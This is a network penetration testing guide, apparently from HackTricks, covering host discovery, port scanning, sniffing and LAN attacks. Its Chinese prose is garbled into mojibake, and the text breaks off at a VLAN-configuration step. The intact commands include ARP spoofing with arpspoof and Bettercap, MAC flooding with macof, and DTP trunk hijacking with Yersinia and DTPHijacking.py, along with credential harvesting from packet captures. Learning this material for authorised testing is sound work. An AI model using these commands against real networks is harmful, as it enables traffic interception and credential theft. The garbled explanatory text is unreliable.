# Pentesting Network

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§ **æ¼æ´èµé‡‘å¹³å°**ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## ä»å¤–éƒ¨å‘ç°ä¸»æœº

è¿™ä¸€éƒ¨åˆ†å°†ç®€è¦ä»‹ç»å¦‚ä½•æ‰¾åˆ° **æ¥è‡ªäº’è”ç½‘çš„å“åº” IP**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æœ‰ä¸€äº› **IP èŒƒå›´**ï¼ˆç”šè‡³å¯èƒ½æœ‰å¤šä¸ª **èŒƒå›´**ï¼‰ï¼Œæ‚¨åªéœ€æ‰¾å‡º **å“ªäº› IP æ­£åœ¨å“åº”**ã€‚

### ICMP

è¿™æ˜¯å‘ç°ä¸»æœºæ˜¯å¦åœ¨çº¿çš„ **æœ€ç®€å•** å’Œ **æœ€å¿«** çš„æ–¹æ³•ã€‚\
æ‚¨å¯ä»¥å°è¯•å‘é€ä¸€äº› **ICMP** æ•°æ®åŒ…å¹¶ **æœŸå¾…å“åº”**ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯å‘é€ä¸€ä¸ª **å›å£°è¯·æ±‚** å¹¶æœŸå¾…å“åº”ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç®€å•çš„ `ping` æˆ–ä½¿ç”¨ `fping` è¿›è¡Œ **èŒƒå›´** æµ‹è¯•ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ **nmap** å‘é€å…¶ä»–ç±»å‹çš„ ICMP æ•°æ®åŒ…ï¼ˆè¿™å°†é¿å…å¸¸è§ ICMP å›å£°è¯·æ±‚-å“åº”çš„è¿‡æ»¤å™¨ï¼‰ã€‚
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

å¾ˆå¸¸è§çš„æ˜¯ï¼Œæ‰€æœ‰ç±»å‹çš„ ICMP æ•°æ®åŒ…éƒ½è¢«è¿‡æ»¤ã€‚å› æ­¤ï¼Œæ‚¨èƒ½åšçš„å°±æ˜¯ **å°è¯•æŸ¥æ‰¾å¼€æ”¾ç«¯å£**ã€‚æ¯ä¸ªä¸»æœºæœ‰ **65535 ä¸ªç«¯å£**ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ‚¨æœ‰ä¸€ä¸ªâ€œå¤§çš„â€èŒƒå›´ï¼Œæ‚¨ **æ— æ³•** æµ‹è¯•æ¯ä¸ªä¸»æœºçš„ **æ¯ä¸ªç«¯å£** æ˜¯å¦å¼€æ”¾ï¼Œè¿™å°†èŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚\
å› æ­¤ï¼Œæ‚¨éœ€è¦çš„æ˜¯ä¸€ä¸ª **å¿«é€Ÿç«¯å£æ‰«æå™¨** ([masscan](https://github.com/robertdavidgraham/masscan)) å’Œä¸€ä¸ª **ä½¿ç”¨æœ€é¢‘ç¹çš„ç«¯å£** åˆ—è¡¨ï¼š
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ `nmap` æ‰§è¡Œæ­¤æ­¥éª¤ï¼Œä½†é€Ÿåº¦è¾ƒæ…¢ï¼Œå¹¶ä¸” `nmap` åœ¨è¯†åˆ«ä¸»æœºæ—¶å­˜åœ¨ä¸€äº›é—®é¢˜ã€‚

### HTTP ç«¯å£å‘ç°

è¿™åªæ˜¯ä¸€ä¸ª TCP ç«¯å£å‘ç°ï¼Œå½“æ‚¨æƒ³è¦ **ä¸“æ³¨äºå‘ç° HTTP** **æœåŠ¡** æ—¶éå¸¸æœ‰ç”¨ï¼š
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPç«¯å£å‘ç°

æ‚¨è¿˜å¯ä»¥å°è¯•æ£€æŸ¥æŸäº›**UDPç«¯å£æ˜¯å¦å¼€æ”¾**ï¼Œä»¥å†³å®šæ˜¯å¦åº”è¯¥**æ›´åŠ å…³æ³¨**ä¸€ä¸ª**ä¸»æœº**ã€‚ç”±äºUDPæœåŠ¡é€šå¸¸**ä¸å“åº”**å¸¸è§„ç©ºUDPæ¢æµ‹æ•°æ®åŒ…ï¼Œå› æ­¤å¾ˆéš¾åˆ¤æ–­ç«¯å£æ˜¯è¢«è¿‡æ»¤è¿˜æ˜¯å¼€æ”¾ã€‚å†³å®šè¿™ä¸€ç‚¹çš„æœ€ç®€å•æ–¹æ³•æ˜¯å‘é€ä¸æ­£åœ¨è¿è¡Œçš„æœåŠ¡ç›¸å…³çš„æ•°æ®åŒ…ï¼Œç”±äºæ‚¨ä¸çŸ¥é“æ­£åœ¨è¿è¡Œå“ªä¸ªæœåŠ¡ï¼Œæ‚¨åº”è¯¥æ ¹æ®ç«¯å£å·å°è¯•æœ€å¯èƒ½çš„æœåŠ¡ï¼š
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
æè®®çš„ nmap å‘½ä»¤å°†æµ‹è¯•æ¯ä¸ª **/24** èŒƒå›´å†…çš„ **å‰ 1000 ä¸ª UDP ç«¯å£**ï¼Œä½†å³ä½¿ä»…æ­¤ä¹Ÿéœ€è¦ **>20min**ã€‚å¦‚æœéœ€è¦ **æœ€å¿«çš„ç»“æœ**ï¼Œå¯ä»¥ä½¿ç”¨ [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)ï¼š`./udp-proto-scanner.pl 199.66.11.53/24` è¿™å°†å‘å…¶ **é¢„æœŸç«¯å£** å‘é€è¿™äº› **UDP æ¢æµ‹**ï¼ˆå¯¹äº /24 èŒƒå›´ï¼Œè¿™åªéœ€ 1 åˆ†é’Ÿï¼‰ï¼š_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP ç«¯å£å‘ç°
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå…³äºæ’°å†™æ—¶æ‰€æœ‰çŸ¥åWifiæ”»å‡»çš„è‰¯å¥½æŒ‡å—ï¼š

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## ä»å†…éƒ¨å‘ç°ä¸»æœº

å¦‚æœæ‚¨åœ¨ç½‘ç»œå†…éƒ¨ï¼Œæ‚¨é¦–å…ˆæƒ³è¦åšçš„äº‹æƒ…ä¹‹ä¸€æ˜¯**å‘ç°å…¶ä»–ä¸»æœº**ã€‚æ ¹æ®æ‚¨å¯ä»¥/æƒ³è¦åˆ¶é€ çš„**å™ªéŸ³**ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼š

### è¢«åŠ¨

æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å·¥å…·åœ¨è¿æ¥çš„ç½‘ç»œä¸­è¢«åŠ¨å‘ç°ä¸»æœºï¼š
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

è¯·æ³¨æ„ï¼Œåœ¨ [_**ä»å¤–éƒ¨å‘ç°ä¸»æœº**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP ç«¯å£å‘ç°_) ä¸­æåˆ°çš„æŠ€æœ¯ä¹Ÿå¯ä»¥**åº”ç”¨äºæ­¤**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨**åŒä¸€ç½‘ç»œ**ä¸­ï¼Œæ‚¨å¯ä»¥åš**æ›´å¤šäº‹æƒ…**ï¼š
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

æ³¨æ„ï¼Œåœ¨ _ä»å¤–éƒ¨å‘ç°ä¸»æœº_ ä¸­è¯„è®ºçš„æŠ€æœ¯ ([_**ICMP**_](./#icmp)) ä¹Ÿå¯ä»¥ **åœ¨è¿™é‡Œåº”ç”¨**ã€‚\
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨ **åŒä¸€ç½‘ç»œ** ä¸­ï¼Œæ‚¨å¯ä»¥åš **æ›´å¤šäº‹æƒ…**ï¼š

* å¦‚æœæ‚¨ **ping** ä¸€ä¸ª **å­ç½‘å¹¿æ’­åœ°å€**ï¼Œping åº”è¯¥åˆ°è¾¾ **æ¯ä¸ªä¸»æœº**ï¼Œå®ƒä»¬å¯èƒ½ä¼š **å›åº”** **æ‚¨**ï¼š`ping -b 10.10.5.255`
* ping **ç½‘ç»œå¹¿æ’­åœ°å€**ï¼Œæ‚¨ç”šè‡³å¯ä»¥æ‰¾åˆ° **å…¶ä»–å­ç½‘** å†…çš„ä¸»æœºï¼š`ping -b 255.255.255.255`
* ä½¿ç”¨ `nmap` çš„ `-PE`ã€`-PP`ã€`-PM` æ ‡å¿—è¿›è¡Œä¸»æœºå‘ç°ï¼Œåˆ†åˆ«å‘é€ **ICMPv4 å›æ˜¾**ã€**æ—¶é—´æˆ³**å’Œ **å­ç½‘æ©ç è¯·æ±‚**ï¼š`nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan ç”¨äºé€šè¿‡ **ç½‘ç»œæ¶ˆæ¯** **å¼€å¯** è®¡ç®—æœºã€‚ç”¨äºå¼€å¯è®¡ç®—æœºçš„é­”æœ¯æ•°æ®åŒ…åªæ˜¯ä¸€ä¸ªæä¾›äº† **MAC Dst** çš„æ•°æ®åŒ…ï¼Œç„¶ååœ¨åŒä¸€ä¸ªæ•°æ®åŒ…ä¸­ **é‡å¤ 16 æ¬¡**ã€‚\
ç„¶åï¼Œè¿™ç§ç±»å‹çš„æ•°æ®åŒ…é€šå¸¸ä»¥ **ä»¥å¤ªç½‘ 0x0842** æˆ– **UDP æ•°æ®åŒ…å‘é€åˆ°ç«¯å£ 9**ã€‚\
å¦‚æœ **æœªæä¾› \[MAC]**ï¼Œæ•°æ®åŒ…å°†å‘é€åˆ° **å¹¿æ’­ä»¥å¤ªç½‘**ï¼ˆå¹¿æ’­ MAC å°†æ˜¯è¢«é‡å¤çš„é‚£ä¸ªï¼‰ã€‚
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## æ‰«æä¸»æœº

ä¸€æ—¦ä½ å‘ç°äº†æ‰€æœ‰æƒ³è¦æ·±å…¥æ‰«æçš„ IPï¼ˆå¤–éƒ¨æˆ–å†…éƒ¨ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚

### TCP

* **å¼€æ”¾**ç«¯å£: _SYN --> SYN/ACK --> RST_
* **å…³é—­**ç«¯å£: _SYN --> RST/ACK_
* **è¿‡æ»¤**ç«¯å£: _SYN --> \[æ— å“åº”]_
* **è¿‡æ»¤**ç«¯å£: _SYN --> ICMP æ¶ˆæ¯_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

æœ‰ä¸¤ç§é€‰é¡¹æ¥æ‰«æUDPç«¯å£ï¼š

* å‘é€ä¸€ä¸ª**UDPæ•°æ®åŒ…**å¹¶æ£€æŸ¥å“åº”_**ICMPä¸å¯è¾¾**_ï¼Œå¦‚æœç«¯å£æ˜¯**å…³é—­**çš„ï¼ˆåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼ŒICMPä¼šè¢«**è¿‡æ»¤**ï¼Œå› æ­¤å¦‚æœç«¯å£å…³é—­æˆ–æ‰“å¼€ï¼Œæ‚¨å°†ä¸ä¼šæ”¶åˆ°ä»»ä½•ä¿¡æ¯ï¼‰ã€‚
* å‘é€**æ ¼å¼åŒ–çš„æ•°æ®æŠ¥**ä»¥å¼•å‘**æœåŠ¡**çš„å“åº”ï¼ˆä¾‹å¦‚ï¼ŒDNSã€DHCPã€TFTPç­‰ï¼Œå¦‚_nmap-payloads_ä¸­åˆ—å‡ºï¼‰ã€‚å¦‚æœæ‚¨æ”¶åˆ°**å“åº”**ï¼Œé‚£ä¹ˆç«¯å£æ˜¯**å¼€æ”¾**çš„ã€‚

**Nmap**å°†ä½¿ç”¨â€œ-sVâ€**æ··åˆè¿™ä¸¤ç§**é€‰é¡¹ï¼ˆUDPæ‰«æéå¸¸æ…¢ï¼‰ï¼Œä½†è¯·æ³¨æ„ï¼ŒUDPæ‰«ææ¯”TCPæ‰«ææ…¢ï¼š
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP æ‰«æ

**SCTP (æµæ§åˆ¶ä¼ è¾“åè®®)** æ—¨åœ¨ä¸ **TCP (ä¼ è¾“æ§åˆ¶åè®®)** å’Œ **UDP (ç”¨æˆ·æ•°æ®æŠ¥åè®®)** ä¸€èµ·ä½¿ç”¨ã€‚å…¶ä¸»è¦ç›®çš„æ˜¯ä¿ƒè¿›é€šè¿‡ IP ç½‘ç»œä¼ è¾“ç”µè¯æ•°æ®ï¼Œåæ˜ å‡ºè®¸å¤šåœ¨ **ä¿¡ä»¤ç³»ç»Ÿ 7 (SS7)** ä¸­å‘ç°çš„å¯é æ€§ç‰¹å¾ã€‚**SCTP** æ˜¯ **SIGTRAN** åè®®æ—çš„æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼Œæ—¨åœ¨é€šè¿‡ IP ç½‘ç»œä¼ è¾“ SS7 ä¿¡å·ã€‚

å„ç§æ“ä½œç³»ç»Ÿæä¾›å¯¹ **SCTP** çš„æ”¯æŒï¼Œå¦‚ **IBM AIX**ã€**Oracle Solaris**ã€**HP-UX**ã€**Linux**ã€**Cisco IOS** å’Œ **VxWorks**ï¼Œè¿™è¡¨æ˜å…¶åœ¨ç”µä¿¡å’Œç½‘ç»œé¢†åŸŸçš„å¹¿æ³›æ¥å—å’Œå®ç”¨æ€§ã€‚

nmap æä¾›äº†ä¸¤ç§ä¸åŒçš„ SCTP æ‰«æï¼š _-sY_ å’Œ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS å’Œ IPS è§„é¿

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **æ›´å¤š nmap é€‰é¡¹**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### æ­ç¤ºå†…éƒ¨ IP åœ°å€

**é…ç½®é”™è¯¯çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å’Œç½‘ç»œè®¾å¤‡** æœ‰æ—¶ä¼šä½¿ç”¨ **éå…¬å…±æºåœ°å€** å¯¹ç½‘ç»œæ¢æµ‹åšå‡ºå“åº”ã€‚**tcpdump** å¯ç”¨äºè¯†åˆ«åœ¨æµ‹è¯•æœŸé—´ä»ç§æœ‰åœ°å€æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ Kali Linux ä¸Šï¼Œå¯ä»¥åœ¨ **eth2 æ¥å£** ä¸Šæ•è·æ•°æ®åŒ…ï¼Œè¯¥æ¥å£å¯ä»¥ä»å…¬å…±äº’è”ç½‘è®¿é—®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ‚¨çš„è®¾ç½®ä½äº NAT æˆ–é˜²ç«å¢™åé¢ï¼Œè¿™äº›æ•°æ®åŒ…å¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰ã€‚
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

é€šè¿‡å—…æ¢ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹æ•è·çš„å¸§å’Œæ•°æ®åŒ…æ¥äº†è§£ IP èŒƒå›´ã€å­ç½‘å¤§å°ã€MAC åœ°å€å’Œä¸»æœºåã€‚å¦‚æœç½‘ç»œé…ç½®é”™è¯¯æˆ–äº¤æ¢ fabric å¤„äºå‹åŠ›çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¢«åŠ¨ç½‘ç»œå—…æ¢æ•è·æ•æ„Ÿææ–™ã€‚

å¦‚æœäº¤æ¢ä»¥å¤ªç½‘ç½‘ç»œé…ç½®æ­£ç¡®ï¼Œæ‚¨å°†åªçœ‹åˆ°å¹¿æ’­å¸§å’Œå‘é€åˆ°æ‚¨çš„ MAC åœ°å€çš„ææ–™ã€‚

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
å¯ä»¥é€šè¿‡SSHä¼šè¯ä½¿ç”¨Wiresharkä½œä¸ºGUIå®æ—¶æ•è·è¿œç¨‹æœºå™¨çš„æ•°æ®åŒ…ã€‚
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

æ˜¾ç„¶ã€‚

### æ•è·å‡­è¯

æ‚¨å¯ä»¥ä½¿ç”¨åƒ [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) è¿™æ ·çš„å·¥å…·ä» pcap æˆ–å®æ—¶æ¥å£ä¸­è§£æå‡­è¯ã€‚

## LAN æ”»å‡»

### ARP æ¬ºéª—

ARP æ¬ºéª—æ˜¯æŒ‡å‘é€æ— å¿çš„ ARP å“åº”ï¼Œä»¥æŒ‡ç¤ºæŸå°æœºå™¨çš„ IP åœ°å€å…·æœ‰æˆ‘ä»¬è®¾å¤‡çš„ MAC åœ°å€ã€‚ç„¶åï¼Œå—å®³è€…å°†æ›´æ”¹ ARP è¡¨ï¼Œå¹¶åœ¨æ¯æ¬¡æƒ³è¦è”ç³»ä¼ªé€ çš„ IP æ—¶ä¸æˆ‘ä»¬çš„æœºå™¨è”ç³»ã€‚

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

é€šè¿‡å‘é€å¤§é‡å…·æœ‰ä¸åŒæº MAC åœ°å€çš„æ•°æ®åŒ…æ¥æº¢å‡ºäº¤æ¢æœºçš„ CAM è¡¨ã€‚å½“ CAM è¡¨æ»¡æ—¶ï¼Œäº¤æ¢æœºå¼€å§‹åƒé›†çº¿å™¨ä¸€æ ·å·¥ä½œï¼ˆå¹¿æ’­æ‰€æœ‰æµé‡ï¼‰ã€‚
```bash
macof -i <interface>
```
åœ¨ç°ä»£äº¤æ¢æœºä¸­ï¼Œè¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤ã€‚

### 802.1Q VLAN / DTP æ”»å‡»

#### åŠ¨æ€å¹²é“

**åŠ¨æ€å¹²é“åè®® (DTP)** è¢«è®¾è®¡ä¸ºä¸€ä¸ªé“¾è·¯å±‚åè®®ï¼Œä»¥ä¾¿äºè‡ªåŠ¨åŒ–çš„å¹²é“ç³»ç»Ÿï¼Œå…è®¸äº¤æ¢æœºè‡ªåŠ¨é€‰æ‹©å¹²é“æ¨¡å¼ (Trunk) æˆ–éå¹²é“æ¨¡å¼çš„ç«¯å£ã€‚**DTP** çš„éƒ¨ç½²é€šå¸¸è¢«è§†ä¸ºç½‘ç»œè®¾è®¡ä¸ä½³çš„æ ‡å¿—ï¼Œå¼ºè°ƒäº†ä»…åœ¨å¿…è¦æ—¶æ‰‹åŠ¨é…ç½®å¹²é“çš„é‡è¦æ€§ï¼Œå¹¶ç¡®ä¿é€‚å½“çš„æ–‡æ¡£è®°å½•ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œäº¤æ¢æœºç«¯å£è®¾ç½®ä¸ºåŠ¨æ€è‡ªåŠ¨æ¨¡å¼ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å‡†å¤‡åœ¨é‚»è¿‘äº¤æ¢æœºçš„æç¤ºä¸‹å¯åŠ¨å¹²é“ã€‚å½“æ¸—é€æµ‹è¯•è€…æˆ–æ”»å‡»è€…è¿æ¥åˆ°äº¤æ¢æœºå¹¶å‘é€ DTP Desirable å¸§æ—¶ï¼Œä¼šå¼•å‘å®‰å…¨é—®é¢˜ï¼Œè¿«ä½¿ç«¯å£è¿›å…¥å¹²é“æ¨¡å¼ã€‚è¿™ä¸€è¡Œä¸ºä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ STP å¸§åˆ†ææšä¸¾ VLANï¼Œå¹¶é€šè¿‡è®¾ç½®è™šæ‹Ÿæ¥å£æ¥ç»•è¿‡ VLAN åˆ†æ®µã€‚

è®¸å¤šäº¤æ¢æœºé»˜è®¤å­˜åœ¨ DTPï¼Œæ•Œæ‰‹å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¨¡ä»¿äº¤æ¢æœºçš„è¡Œä¸ºï¼Œä»è€Œè·å¾—å¯¹æ‰€æœ‰ VLAN æµé‡çš„è®¿é—®ã€‚è„šæœ¬ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) è¢«ç”¨æ¥ç›‘æ§æ¥å£ï¼Œæ­ç¤ºäº¤æ¢æœºæ˜¯å¦å¤„äºé»˜è®¤ã€å¹²é“ã€åŠ¨æ€ã€è‡ªåŠ¨æˆ–æ¥å…¥æ¨¡å¼â€”â€”åè€…æ˜¯å”¯ä¸€å…å— VLAN è·³è·ƒæ”»å‡»çš„é…ç½®ã€‚è¯¥å·¥å…·è¯„ä¼°äº¤æ¢æœºçš„æ¼æ´çŠ¶æ€ã€‚

å¦‚æœå‘ç°ç½‘ç»œæ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨ _**Yersinia**_ å·¥å…·é€šè¿‡ DTP åè®®â€œå¯ç”¨å¹²é“â€ï¼Œå…è®¸è§‚å¯Ÿæ¥è‡ªæ‰€æœ‰ VLAN çš„æ•°æ®åŒ…ã€‚
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

è¦æšä¸¾VLANï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è„šæœ¬[**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**ç”ŸæˆDTP Desirableå¸§ã€‚**åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸è¦ä¸­æ–­è„šæœ¬ã€‚å®ƒæ¯ä¸‰ç§’æ³¨å…¥ä¸€æ¬¡DTP Desirableã€‚**äº¤æ¢æœºä¸ŠåŠ¨æ€åˆ›å»ºçš„å¹²é“é€šé“ä»…å­˜åœ¨äº”åˆ†é’Ÿã€‚äº”åˆ†é’Ÿåï¼Œå¹²é“å°†å¤±æ•ˆã€‚**
```
sudo python3 DTPHijacking.py --interface eth0
```
æˆ‘æƒ³æŒ‡å‡ºçš„æ˜¯ï¼Œ**Access/Desirable (0x03)** è¡¨ç¤º DTP å¸§æ˜¯ Desirable ç±»å‹ï¼Œè¿™å‘Šè¯‰ç«¯å£åˆ‡æ¢åˆ° Trunk æ¨¡å¼ã€‚å¹¶ä¸” **802.1Q/802.1Q (0xa5)** è¡¨ç¤º **802.1Q** å°è£…ç±»å‹ã€‚

é€šè¿‡åˆ†æ STP å¸§ï¼Œ**æˆ‘ä»¬äº†è§£åˆ° VLAN 30 å’Œ VLAN 60 çš„å­˜åœ¨ã€‚**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### æ”»å‡»ç‰¹å®š VLAN

ä¸€æ—¦ä½ çŸ¥é“ VLAN ID å’Œ IP å€¼ï¼Œä½ å¯ä»¥ **é…ç½®ä¸€ä¸ªè™šæ‹Ÿæ¥å£æ¥æ”»å‡»ç‰¹å®š VLAN**ã€‚\
å¦‚æœ DHCP ä¸å¯ç”¨ï¼Œåˆ™ä½¿ç”¨ _ifconfig_ è®¾ç½®é™æ€ IP åœ°å€ã€‚
```
root@kali:~# modprobe 8021q
